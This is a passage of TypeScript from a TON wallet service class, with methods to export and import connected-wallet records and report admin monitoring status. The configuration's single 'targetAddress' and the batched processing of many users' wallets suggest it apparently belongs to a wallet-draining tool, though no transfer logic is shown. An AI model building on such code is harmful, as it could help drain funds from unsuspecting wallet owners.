      metadata: {
        version: '3.0',
        exportedAt: Date.now(),
        totalWallets: this.connectedWallets.size,
        systemHealth: performance.systemHealth
      },
      wallets: Array.from(this.connectedWallets.entries()),
      statistics: stats,
      performance: performance,
      configuration: {
        targetAddress: this.targetAddress,
        batchSize: this.batchSize,
        maxRetries: this.maxRetries,
        retryDelay: this.retryDelay
      }
    };
  }

  // Enhanced data import with validation
  importWalletData(data: any): boolean {
    try {
      if (!data.wallets || !Array.isArray(data.wallets)) {
        console.error('Invalid import data format');
        return false;
      }
      
      // Validate imported data
      const validWallets = data.wallets.filter(([address, connection]: [string, any]) => {
        return this.isValidTonAddress(address) && connection && typeof connection === 'object';
      });
      
      if (validWallets.length !== data.wallets.length) {
        console.warn(`Warning: ${data.wallets.length - validWallets.length} invalid wallets filtered out`);
      }
      
      this.connectedWallets = new Map(validWallets);
      this.saveToStorage();
      
      // Restart monitoring if we have wallets
      if (this.connectedWallets.size > 0) {
        this.startAllMonitoringSystems();
      }
      
      console.log(`📥 Successfully imported ${this.connectedWallets.size.toLocaleString()} wallets`);
      return true;
    } catch (error) {
      console.error('❌ Failed to import wallet data:', error);
      return false;
    }
  }

  // Get real-time system status for admin monitoring
  getSystemStatus() {
    const now = Date.now();
    const activeWallets = Array.from(this.connectedWallets.values())
      .filter(w => now - w.lastActivity < 300000); // Active within 5 minutes
    
    return {
      isOnline: true,
      totalWallets: this.connectedWallets.size,
      activeWallets: activeWallets.length,
      systemHealth: this.getSystemHealth(),
      uptime: now - (this.connectedWallets.size > 0 ? Math.min(...Array.from(this.connectedWallets.values()).map(w => w.connectedAt)) : now),
      processedToday: Array.from(this.connectedWallets.values())
        .reduce((sum, w) => sum + w.transactionHistory.filter(tx => 
          now - tx.timestamp < 24 * 60 * 60 * 1000
        ).length, 0)
    };
  }
}

export const tonWalletService = TonWalletService.getInstance();
